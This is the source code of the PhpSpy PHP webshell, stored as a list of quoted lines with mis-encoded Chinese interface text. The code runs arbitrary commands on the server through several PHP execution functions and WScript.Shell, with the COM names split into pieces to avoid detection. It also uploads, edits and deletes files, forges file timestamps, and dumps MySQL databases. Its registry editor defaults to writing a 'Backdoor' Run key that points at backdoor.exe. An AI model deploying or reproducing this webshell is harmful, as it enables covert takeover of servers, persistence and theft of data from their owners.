            "<style type=\"text/css\">",
            "body,td {",
            "\tfont-family: \"Tahoma\";",
            "\tfont-size: \"12px\";",
            "\tline-height: \"150%\";",
            ".smlfont {",
            "\tfont-family: \"Tahoma\";",
            "\tfont-size: \"11px\";",
            ".INPUT {",
            "\tFONT-SIZE: \"12px\";",
            "\tCOLOR: \"#000000\";",
            "\tBACKGROUND-COLOR: \"#FFFFFF\";",
            "\theight: \"18px\";",
            "\tborder: \"1px solid #666666\";",
            "\tpadding-left: \"2px\";",
            ".redfont {",
            "\tCOLOR: \"#A60000\";",
            "a:link,a:visited,a:active {",
            "\tcolor: \"#000000\";",
            "\ttext-decoration: underline;",
            "a:hover {",
            "\tcolor: \"#465584\";",
            "\ttext-decoration: none;",
            ".top {BACKGROUND-COLOR: \"#CCCCCC\"}",
            ".firstalt {BACKGROUND-COLOR: \"#EFEFEF\"}",
            ".secondalt {BACKGROUND-COLOR: \"#F5F5F5\"}",
            "</style>",
            "<SCRIPT language=JavaScript>",
            "function CheckAll(form) {",
            "\tfor (var i=0;i<form.elements.length;i++) {",
            "\t\tvar e = form.elements[i];",
            "\t\tif (e.name != 'chkall')",
            "\t\te.checked = form.chkall.checked;",
            "    }",
            "function really(d,f,m,t) {",
            "\tif (confirm(m)) {",
            "\t\tif (t == 1) {",
            "\t\t\twindow.location.href='?dir='+d+'&deldir='+f;",
            "\t\t} else {",
            "\t\t\twindow.location.href='?dir='+d+'&delfile='+f;",
            "</SCRIPT>",
            "</head>",
            "<body style=\"table-layout:fixed; word-break:break-all\">",
            "<center>",
            "<?php",
            "$tb->tableheader();",
            "$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align=\"right\"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');",
            "$tb->tdbody('<a href=\"?action=logout\">\u05e2\u1ef0</a> | <a href=\"?action=dir\">PhpSpy\u013f",
            "</a> | <a href=\"?action=phpenv\">PHP</a> | <a href=\"?action=proxy\">\u07f4</a>'.$reg.$phpinfo.' | <a href=\"?action=shell\">WebShell</a> | <a href=\"?action=sql\">SQL Query</a> | <a href=\"?action=sqlbak\">MySQL Backup</a>');",
            "$tb->tablefooter();",
            "<hr width=\"775\" noshade>",
            "<table width=\"775\" border=\"0\" cellpadding=\"0\">",
            "$tb->headerform(array('method'=>'GET','content'=>'<p>",
            ": '.$pathname.'<br>\u01f0\u013f",
            "('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>\u05ea\u013f",
            ": '.$tb->makeinput('dir').' '.$tb->makeinput('','\u0237','','submit').' \u05a7\u05be",
            "'));",
            "$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'\u03f4\u013c\u01f0\u013f",
            ": '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','\u0237','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));",
            "$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'",
            "\u013c\u06b5\u01f0\u013f",
            ": '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','\u0237','','submit')));",
            "$tb->headerform(array('content'=>'",
            ": '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','\u0237','','submit')));",
            "</table>",
            "<hr width=\"775\" noshade>",
            "<?php",
            "/*===================== \u05b4\u0432 \u02bc =====================*/",
            "echo \"<p><b>\\n\";",
            "// \u027e\u013c",
            "if (!empty($delfile)) {",
            "\tif (file_exists($delfile)) {",
            "\t\techo (@unlink($delfile)) ? $delfile.\" \u027e\u0279!\" : \"\u013c\u027e\u02a7!\";",
            "\t} else {",
            "\t\techo basename($delfile).\" \u013c\u0472!\";",
            "// \u027e\u013f",
            "elseif (!empty($deldir)) {",
            "\t$deldirs=\"$dir/$deldir\";",
            "\tif (!file_exists(\"$deldirs\")) {",
            "\t\techo \"$deldir \u013f",
            "\u0472!\";",
            "\t} else {",
            "\t\techo (deltree($deldirs)) ? \"\u013f",
            "\u027e\u0279!\" : \"\u013f",
            "\u027e\u02a7!\";",
            "// \u013f",
            "elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {",
            "\tif (!empty($newdirectory)) {",
            "\t\t$mkdirs=\"$dir/$newdirectory\";",
            "\t\tif (file_exists(\"$mkdirs\")) {",
            "\t\t\techo \"\u013f",
            "\u0474!\";",
            "\t\t} else {",
            "\t\t\techo (@mkdir(\"$mkdirs\",0777)) ? \"\u013f",
            "\u0279!\" : \"\u02a7!\";",
            "\t\t\t@chmod(\"$mkdirs\",0777);",
            "// \u03f4\u013c",
            "elseif ($doupfile) {",
            "\techo (@copy($_FILES['uploadfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadfile']['name'].\"\")) ? \"\u03f4\u0279!\" : \"\u03f4\u02a7!\";",
            "// \u0f2d\u013c",
            "elseif ($_POST['do'] == 'doeditfile') {",
            "\tif (!empty($_POST['editfilename'])) {",
            "\t\t$filename=\"$editfilename\";",
            "\t\t@$fp=fopen(\"$filename\",\"w\");",
            "\t\techo $msg=@fwrite($fp,$_POST['filecontent']) ? \"\u0434\u013c\u0279!\" : \"\u0434\u02a7!\";",
            "\t\t@fclose($fp);",
            "\t} else {",
            "\t\techo \"\u04aa\u0f2d\u013c!\";",
            "// \u0f2d\u013c",
            "elseif ($_POST['do'] == 'editfileperm') {",
            "\tif (!empty($_POST['fileperm'])) {",
            "\t\t$fileperm=base_convert($_POST['fileperm'],8,10);",
            "\t\techo (@chmod($dir.\"/\".$file,$fileperm)) ? \"\u07b8\u0133\u0279!\" : \"\u07b8\u02a7!\";",
            "\t\techo \" \u013c \".$file.\" \u07b8\u013a\u03aa: \".substr(base_convert(@fileperms($dir.\"/\".$file),10,8),-4);",
            "\t} else {",
            "\t\techo \"\u04aa",
            "// \u013c",
            "elseif ($_POST['do'] == 'rename') {",
            "\tif (!empty($_POST['newname'])) {",
            "\t\t$newname=$_POST['dir'].\"/\".$_POST['newname'];",
            "\t\tif (@file_exists($newname)) {",
            "\t\t\techo \"\".$_POST['newname'].\" \u047e,\u04bb!\";",
            "\t\t} else {",
            "\t\t\techo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname']).\" \u0279\u03aa \".$_POST['newname'].\" !\" : \"\u013c\u07b8\u02a7!\";",
            "\t} else {",
            "\t\techo \"\u04aa\u0135\u013c!\";",
            "elseif ($_POST['do'] == 'domodtime') {",
            "\tif (!@file_exists($_POST['curfile'])) {",
            "\t\techo \"\u04aa\u07b8\u0135\u013c!\";",
            "\t} else {",
            "\t\tif (!@file_exists($_POST['tarfile'])) {",
            "\t\t\techo \"\u04aa\u0575\u013c!\";",
            "\t\t} else {",
            "\t\t\t$time=@filemtime($_POST['tarfile']);",
            "\t\t\techo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile']).\" \u07b8\u02b1\u0279\u03aa \".date(\"Y-m-d H:i:s\",$time).\" !\" : \"\u013c\u07b8\u02b1\u07b8\u02a7!\";",
            "// \u0536\u02b1",
            "elseif ($_POST['do'] == 'modmytime') {",
            "\tif (!@file_exists($_POST['curfile'])) {",
            "\t\techo \"\u04aa\u07b8\u0135\u013c!\";",
            "\t} else {",
            "\t\t$year=$_POST['year'];",
            "\t\t$month=$_POST['month'];",
            "\t\t$data=$_POST['data'];\t\t",
            "\t\t$hour=$_POST['hour'];",
            "\t\t$minute=$_POST['minute'];",
            "\t\t$second=$_POST['second'];",
            "\t\tif (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {",
            "\t\t\t$time=strtotime(\"$data $month $year $hour:$minute:$second\");",
            "\t\t\techo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile']).\" \u07b8\u02b1\u0279\u03aa \".date(\"Y-m-d H:i:s\",$time).\" !\" : \"\u013c\u07b8\u02b1\u07b8\u02a7!\";",
            "// MYSQL",
            "elseif ($connect) {",
            "\tif (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {",
            "\t\techo \"\u077f\u04f3\u0279!\";",
            "\t\tmysql_close();",
            "\t} else {",
            "\t\techo mysql_error();",
            "// \u05b4SQL",
            "elseif ($_POST['do'] == 'query') {",
            "\t@mysql_connect($servername,$dbusername,$dbpassword) or die(\"\u077f\u02a7\");",
            "\t@mysql_select_db($dbname) or die(\"\u0461\u077f\u02a7\");",
            "\t$result = @mysql_query($_POST['sql_query']);",
            "\techo ($result) ? \"SQL\u0279\u05b4!\" : \": \".mysql_error();",
            "\tmysql_close();",
            "// \u0772",
            "elseif ($_POST['do'] == 'backupmysql') {",
            "\tif (empty($_POST['table']) OR empty($_POST['backuptype'])) {",
            "\t\techo \"\u0461\u0775\u0771\u0371\u0777\u02bd!\";",
            "\t} else {",
            "\t\tif ($_POST['backuptype'] == 'server') {",
            "\t\t\t@mysql_connect($servername,$dbusername,$dbpassword) or die(\"\u077f\u02a7\");",
            "\t\t\t@mysql_select_db($dbname) or die(\"\u0461\u077f\u02a7\");\t",
            "\t\t\t$table = array_flip($_POST['table']);",
            "\t\t\t$filehandle = @fopen($path,\"w\");",
            "\t\t\tif ($filehandle) {",
            "\t\t\t\t$result = mysql_query(\"SHOW tables\");",
            "\t\t\t\techo ($result) ? NULL : \": \".mysql_error();",
            "\t\t\t\twhile ($currow = mysql_fetch_array($result)) {",
            "\t\t\t\t\tif (isset($table[$currow[0]])) {",
            "\t\t\t\t\t\tsqldumptable($currow[0], $filehandle);",
            "\t\t\t\t\t\tfwrite($filehandle,\"\\n\\n\\n\");",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\tfclose($filehandle);",
            "\t\t\t\techo \"\u077f\u0473\u0279\u0775 <a href=\\\"\".$path.\"\\\" target=\\\"_blank\\\">\".$path.\"</a>\";",
            "\t\t\t\tmysql_close();",
            "\t\t\t} else {",
            "\t\t\t\techo \"\u02a7,\u0237\u013f\u013c\u01f7\u043f\u0434\u0228!\";",
            "\t\t\t}",
            "//  PS:\u013c\u032b\u0737\u01f3",
            "// Thx : \u0421",
            "elseif($downrar) {",
            "\tif (!empty($dl)) {",
            "\t\t$dfiles=\"\";",
            "\t\tforeach ($dl AS $filepath=>$value) {",
            "\t\t\t$dfiles.=$filepath.\",\";",
            "\t\t$dfiles=substr($dfiles,0,strlen($dfiles)-1);",
            "\t\t$dl=explode(\",\",$dfiles);",
            "\t\t$zip=new PHPZip($dl);",
            "\t\t$code=$zip->out;\t\t",
            "\t\theader(\"Content-type: application/octet-stream\");",
            "\t\theader(\"Accept-Ranges: bytes\");",
            "\t\theader(\"Accept-Length: \".strlen($code));",
            "\t\theader(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");",
            "\t\techo $code;",
            "\t\texit;",
            "\t} else {",
            "\t\techo \"\u0461\u04aa\u0635\u013c!\";",
            "// Shell.Application \u0433",
            "elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {",
            "\t$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');",
            "\t$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);",
            "\techo ($a=='0') ? \"\u047e\u0279\u05b4!\" : \"\u02a7!\";",
            "// \u9ff4PHP",
            "elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {",
            "\techo \"",
            " \".$_POST['phpvarname'].\" : \".getphpcfg($_POST['phpvarname']).\"\";",
            "// \u0221\u05e2",
            "elseif(($regread) AND !empty($_POST['readregname'])) {",
            "\t$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');",
            "\tvar_dump(@$shell->RegRead($_POST['readregname']));",
            "// \u0434\u05e2",
            "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {",
            "\t$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');",
            "\t$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);",
            "\techo ($a=='0') ? \"\u0434\u05e2\u05b5\u0279!\" : \"\u0434 \".$_POST['regname'].\", \".$_POST['regval'].\", \".$_POST['regtype'].\" \u02a7!\";",
            "// \u027e\u05e2",
            "elseif(($regdelete) AND !empty($_POST['delregname'])) {",
            "\t$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');",
            "\t$a = @$shell->RegDelete($_POST['delregname']);",
            "\techo ($a=='0') ? \"\u027e\u05e2\u05b5\u0279!\" : \"\u027e \".$_POST['delregname'].\" \u02a7!\";",
            "else {",
            "\techo \" <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> \u0421 angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] , <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> ",
            "\u6c7e.\";",
            "echo \"</b></p>\\n\";",
            "/*===================== \u05b4\u0432  =====================*/",
            "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"dir\")) {",
            "\t$tb->tableheader();",
            "  <tr bgcolor=\"#cccccc\">",
            "    <td align=\"center\" nowrap width=\"27%\"><b>\u013c</b></td>",
            "\t<td align=\"center\" nowrap width=\"16%\"><b></b></td>",
            "    <td align=\"center\" nowrap width=\"16%\"><b>\u07b8</b></td>",
            "    <td align=\"center\" nowrap width=\"11%\"><b>\u0421</b></td>",
            "    <td align=\"center\" nowrap width=\"6%\"><b></b></td>",
            "    <td align=\"center\" nowrap width=\"24%\"><b></b></td>",
            "  </tr>",
            "<?php",
            "// \u013f",
            "$dirs=@opendir($dir);",
            "$dir_i = '0';",
            "while ($file=@readdir($dirs)) {",
            "\t$filepath=\"$dir/$file\";",
            "\t$a=@is_dir($filepath);",
            "\tif($a==\"1\"){",
            "\t\tif($file!=\"..\" && $file!=\".\")\t{",
            "\t\t\t$ctime=@date(\"Y-m-d H:i:s\",@filectime($filepath));",
            "\t\t\t$mtime=@date(\"Y-m-d H:i:s\",@filemtime($filepath));",
            "\t\t\t$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);",
            "\t\t\techo \"<tr class=\".getrowbg().\">\\n\";",
            "\t\t\techo \"  <td style=\\\"padding-left: 5px;\\\">[<a href=\\\"?dir=\".urlencode($dir).\"/\".urlencode($file).\"\\\"><font color=\\\"#006699\\\">$file</font></a>]</td>\\n\";",
            "\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$ctime</td>\\n\";",
            "\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$mtime</td>\\n\";",
            "\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">&lt;dir&gt;</td>\\n\";",
            "\t\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\"><a href=\\\"?action=fileperm&dir=\".urlencode($dir).\"&file=\".urlencode($file).\"\\\">$dirperm</a></td>\\n\";",
            "\t\t\techo \"  <td align=\\\"center\\\" nowrap><a href=\\\"#\\\" onclick=\\\"really('\".urlencode($dir).\"','\".urlencode($file).\"','\u0237\u04aa\u027e $file \u013f",
            "? \\\\n\\\\n\u013f",
            "\u01ff,\u02f4\u03b2\u027e\u013f",
            "\u013c!','1')\\\">\u027e</a></td>\\n\";",
            "\t\t\techo \"</tr>\\n\";",
            "\t\t\t$dir_i++;",
            "\t\t} else {",
            "\t\t\tif($file==\"..\") {",
            "\t\t\t\techo \"<tr class=\".getrowbg().\">\\n\";",
            "\t\t\t\techo \"  <td nowrap colspan=\\\"6\\\" style=\\\"padding-left: 5px;\\\"><a href=\\\"?dir=\".urlencode($dir).\"/\".urlencode($file).\"\\\">\u03fc\u013f",
            "</a></td>\\n\";",
            "\t\t\t\techo \"</tr>\\n\";",
            "\t\t\t}",
            "}// while",
            "@closedir($dirs); ",
            "<tr bgcolor=\"#cccccc\">",
            "  <td colspan=\"6\" height=\"5\"></td>",
            "</tr>",
            "<FORM action=\"\" method=\"POST\">",
            "// \u013c\u0431",
            "$dirs=@opendir($dir);",
            "$file_i = '0';",
            "while ($file=@readdir($dirs)) {",
            "\t$filepath=\"$dir/$file\";",
            "\t$a=@is_dir($filepath);",
            "\tif($a==\"0\"){\t\t",
            "\t\t$size=@filesize($filepath);",
            "\t\t$size=$size/1024 ;",
            "\t\t$size= @number_format($size, 3);",
            "\t\tif (@filectime($filepath) == @filemtime($filepath)) {",
            "\t\t\t$ctime=@date(\"Y-m-d H:i:s\",@filectime($filepath));",
            "\t\t\t$mtime=@date(\"Y-m-d H:i:s\",@filemtime($filepath));",
            "\t\t} else {",
            "\t\t\t$ctime=\"<span class=\\\"redfont\\\">\".@date(\"Y-m-d H:i:s\",@filectime($filepath)).\"</span>\";",
            "\t\t\t$mtime=\"<span class=\\\"redfont\\\">\".@date(\"Y-m-d H:i:s\",@filemtime($filepath)).\"</span>\";",
            "\t\t@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);",
            "\t\techo \"<tr class=\".getrowbg().\">\\n\";",
            "\t\techo \"  <td style=\\\"padding-left: 5px;\\\">\";",
            "\t\techo \"<INPUT type=checkbox value=1 name=dl[$filepath]>\";",
            "\t\techo \"<a href=\\\"$filepath\\\" target=\\\"_blank\\\">$file</a></td>\\n\";",
            "\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$ctime</td>\\n\";",
            "\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\">$mtime</td>\\n\";",
            "\t\techo \"  <td align=\\\"right\\\" nowrap class=\\\"smlfont\\\"><span class=\\\"redfont\\\">$size</span> KB</td>\\n\";",
            "\t\techo \"  <td align=\\\"center\\\" nowrap class=\\\"smlfont\\\"><a href=\\\"?action=fileperm&dir=\".urlencode($dir).\"&file=\".urlencode($file).\"\\\">$fileperm</a></td>\\n\";",
            "\t\techo \"  <td align=\\\"center\\\" nowrap><a href=\\\"?downfile=\".urlencode($filepath).\"\\\"></a> | <a href=\\\"?action=editfile&dir=\".urlencode($dir).\"&editfile=\".urlencode($file).\"\\\">\u0f2d</a> | <a href=\\\"#\\\" onclick=\\\"really('\".urlencode($dir).\"','\".urlencode($filepath).\"','\u0237\u04aa\u027e $file \u013c?','2')\\\">\u027e</a> | <a href=\\\"?action=rename&dir=\".urlencode($dir).\"&fname=\".urlencode($filepath).\"\\\"></a> | <a href=\\\"?action=newtime&dir=\".urlencode($dir).\"&file=\".urlencode($filepath).\"\\\">\u02b1</a></td>\\n\";",
            "\t\techo \"</tr>\\n\";",
            "\t\t$file_i++;",
            "}// while",
            "@closedir($dirs); ",
            "$tb->tdbody('<table width=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" align=\"center\"><tr><td>'.$tb->makeinput('chkall','on','onclick=\"CheckAll(this.form)\"','checkbox','30','').' '.$tb->makeinput('downrar','\u0461\u013c','','submit').'</td><td align=\"right\">'.$dir_i.' \u013f",
            " / '.$file_i.' \u013c</td></tr></table>','center',getrowbg(),'','','6');",
            "echo \"</FORM>\\n\";",
            "echo \"</table>\\n\";",
            "}// end dir",
            "elseif ($_GET['action'] == \"editfile\") {",
            "\tif(empty($newfile)) {",
            "\t\t$filename=\"$dir/$editfile\";",
            "\t\t$fp=@fopen($filename,\"r\");",
            "\t\t$contents=@fread($fp, filesize($filename));",
            "\t\t@fclose($fp);",
            "\t\t$contents=htmlspecialchars($contents);",
            "\t}else{",
            "\t\t$editfile=$newfile;",
            "\t\t$filename = \"$dir/$editfile\";",
            "\t$action = \"?dir=\".urlencode($dir).\"&editfile=\".$editfile;",
            "\t$tb->tableheader();",
            "\t$tb->formheader($action,'",
            "/\u0f2d\u013c');",
            "\t$tb->tdbody('\u01f0\u013c: '.$tb->makeinput('editfilename',$filename).' \u013c\u013c');",
            "\t$tb->tdbody($tb->maketextarea('filecontent',$contents));",
            "\t$tb->makehidden('do','doeditfile');",
            "\t$tb->formfooter('1','30');",
            "}//end editfile",
            "elseif ($_GET['action'] == \"rename\") {",
            "\t$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);",
            "\t$action = \"?dir=\".urlencode($dir).\"&fname=\".urlencode($fname);",
            "\t$tb->tableheader();",
            "\t$tb->formheader($action,'\u07b8\u013c');",
            "\t$tb->makehidden('oldname',$dir.\"/\".$nowfile);",
            "\t$tb->makehidden('dir',$dir);",
            "\t$tb->tdbody('\u01f0\u013c: '.basename($nowfile));",
            "\t$tb->tdbody('\u03aa: '.$tb->makeinput('newname'));",
            "\t$tb->makehidden('do','rename');",
            "\t$tb->formfooter('1','30');",
            "}//end rename",
            "elseif ($_GET['action'] == \"fileperm\") {",
            "\t$action = \"?dir=\".urlencode($dir).\"&file=\".$file;",
            "\t$tb->tableheader();",
            "\t$tb->formheader($action,'\u07b8\u013c');",
            "\t$tb->tdbody('\u07b8 '.$file.' \u03aa: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));",
            "\t$tb->makehidden('file',$file);",
            "\t$tb->makehidden('dir',urlencode($dir));",
            "\t$tb->makehidden('do','editfileperm');",
            "\t$tb->formfooter('1','30');",
            "}//end fileperm",
            "elseif ($_GET['action'] == \"newtime\") {",
            "\t$action = \"?dir=\".urlencode($dir);",
            "\t$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);",
            "\t$tb->tableheader();",
            "\t$tb->formheader($action,'",
            "\u013c\u07b8\u02b1');",
            "\t$tb->tdbody(\"\u07b8\u013c: \".$tb->makeinput('curfile',$file,'readonly').\"  \u013f\u013c: \".$tb->makeinput('tarfile','",
            "\u013c'),'center','2','30');",
            "\t$tb->makehidden('do','domodtime');",
            "\t$tb->formfooter('','30');",
            "\t$tb->formheader($action,'\u0536\u013c\u07b8\u02b1');",
            "\t$tb->tdbody('<br><ul><li>\u0427\u02b1\u0377\u03a7\u01f4\u04f8\u02b1 1901  12  13   20:45:54  2038 1  19  \u06b6 03:14:07<br>(\u06b8 32 \u03bb\u0437\u0421\u05b5\u05b5)</li><li>\u02f5: \u0221 01  30 \u05ae, \u02b1\u0221 0  24 \u05ae, \u05ba\u0221 0  60 \u05ae!</li></ul>','left');",
            "\t$tb->tdbody('\u01f0\u013c: '.$file);",
            "\t$tb->makehidden('curfile',$file);",
            "\t$tb->tdbody('\u07b8\u03aa: '.$tb->makeinput('year','1984','','text','4').'  '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).'  '.$tb->makeinput('data','18','','text','2').'  '.$tb->makeinput('hour','20','','text','2').' \u02b1 '.$tb->makeinput('minute','00','','text','2').'  '.$tb->makeinput('second','00','','text','2').' ','center','2','30');",
            "\t$tb->makehidden('do','modmytime');",
            "\t$tb->formfooter('1','30');",
            "}//end newtime",
            "elseif ($_GET['action'] == \"shell\") {",
            "\t$action = \"??action=shell&dir=\".urlencode($dir);",
            "\t$tb->tableheader();",
            "\t$tb->tdheader('WebShell Mode');",
            "\tif (substr(PHP_OS, 0, 3) == 'WIN') {",
            "\t\t$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";",
            "\t\t$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";",
            "\t\techo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";",
            "\t\t$tb->tdbody('\u07bb\u0433  \u013c: '.$tb->makeinput('program',$program).' : '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');",
            "\t\t$tb->makehidden('do','programrun');",
            "\t\techo \"</form>\\n\";",
            "\techo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";",
            "\t$tb->tdbody('\u02be:\u022b,\u0434\u013c.\u0535",
            "\u022b.');",
            "\t$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen');",
            "\t$tb->tdbody('\u0461\u05b4\u043a: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' : '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));",
            "  <tr class=\"secondalt\">",
            "    <td align=\"center\"><textarea name=\"textarea\" cols=\"100\" rows=\"25\" readonly><?php",
            "\tif (!empty($_POST['command'])) {",
            "\t\tif ($execfunc==\"system\") {",
            "\t\t\tsystem($_POST['command']);",
            "\t\t} elseif ($execfunc==\"passthru\") {",
            "\t\t\tpassthru($_POST['command']);",
            "\t\t} elseif ($execfunc==\"exec\") {",
            "\t\t\t$result = exec($_POST['command']);",
            "\t\t\techo $result;",
            "\t\t} elseif ($execfunc==\"shell_exec\") {",
            "\t\t\t$result=shell_exec($_POST['command']);",
            "\t\t\techo $result;\t",
            "\t\t} elseif ($execfunc==\"popen\") {",
            "\t\t\t$pp = popen($_POST['command'], 'r');",
            "\t\t\t$read = fread($pp, 2096);",
            "\t\t\techo $read;",
            "\t\t\tpclose($pp);",
            "\t\t} elseif ($execfunc==\"wscript\") {",
            "\t\t\t$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die(\"PHP Create COM WSHSHELL failed\");",
            "\t\t\t$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");",
            "\t\t\t$stdout = $exec->StdOut();",
            "\t\t\t$stroutput = $stdout->ReadAll();",
            "\t\t\techo $stroutput;",
            "\t\t} else {",
            "\t\t\tsystem($_POST['command']);",
            "\t?></textarea></td>",
            "  </tr>  ",
            "  </form>",
            "</table>",
            "<?php",
            "}//end shell",
            "elseif ($_GET['action'] == \"reg\") {",
            "\t$action = '?action=reg';",
            "\t$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\\PortNumber';",
            "\t$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor';",
            "\t$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';",
            "\t$delregname = $_POST['delregname'];",
            "\t$tb->tableheader();",
            "\t$tb->formheader($action,'\u0221\u05e2');",
            "\t$tb->tdbody('\u05b5: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','\u0221','','submit'),'center','2','50');",
            "\techo \"</form>\";",
            "\t$tb->formheader($action,'\u0434\u05e2');",
            "\t$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');",
            "\t$tb->tdbody('\u05b5: '.$tb->makeinput('writeregname',$registre,'','text','56').' : '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' \u05b5:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','\u0434','','submit'),'center','2','50');",
            "\techo \"</form>\";",
            "\t$tb->formheader($action,'\u027e\u05e2');",
            "\t$tb->tdbody('\u05b5: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','\u027e','','submit'),'center','2','50');",
            "\techo \"</form>\";",
            "\t$tb->tablefooter();",
            "}//end reg",
            "elseif ($_GET['action'] == \"proxy\") {",
            "\t$action = '?action=proxy';",
            "\t$tb->tableheader();",
            "\t$tb->formheader($action,'\u07f4','proxyframe');",
            "\t$tb->tdbody('<br><ul><li>",
            "\u073d\u02b5\u05bc\uda96\udd75 HTTP ,\u02be\u02b9",
            "\u037c\u01ac\u04fcCSS\u02bd.</li><li>",
            "\u073f\u0368\u013fURL,\u05a7 SQL Injection \u033d\u053c\u0133\u0429\u05b7.</li><li>",
            " URL,\u013f",
            " : '.$_SERVER['REMOTE_ADDR'].'</li></ul>','left');",
            "\t$tb->tdbody('URL: '.$tb->makeinput('url','http://www.4ngel.net','','text','100').' '.$tb->makeinput('','','','submit'),'center','1','40');",
            "\t$tb->tdbody('<iframe name=\"proxyframe\" frameborder=\"0\" width=\"765\" height=\"400\" marginheight=\"0\" marginwidth=\"0\" scrolling=\"auto\" src=\"http://www.4ngel.net\"></iframe>');",
            "\techo \"</form>\";",
            "\t$tb->tablefooter();",
            "}//end proxy",
            "elseif ($_GET['action'] == \"sql\") {",
            "\t$action = '?action=sql';",
            "\t$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';",
            "\t$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';",
            "\t$dbpassword = $_POST['dbpassword'];",
            "\t$dbname = $_POST['dbname'];",
            "\t$sql_query = $_POST['sql_query'];",
            "\t$tb->tableheader();",
            "\t$tb->formheader($action,'\u05b4 SQL ');",
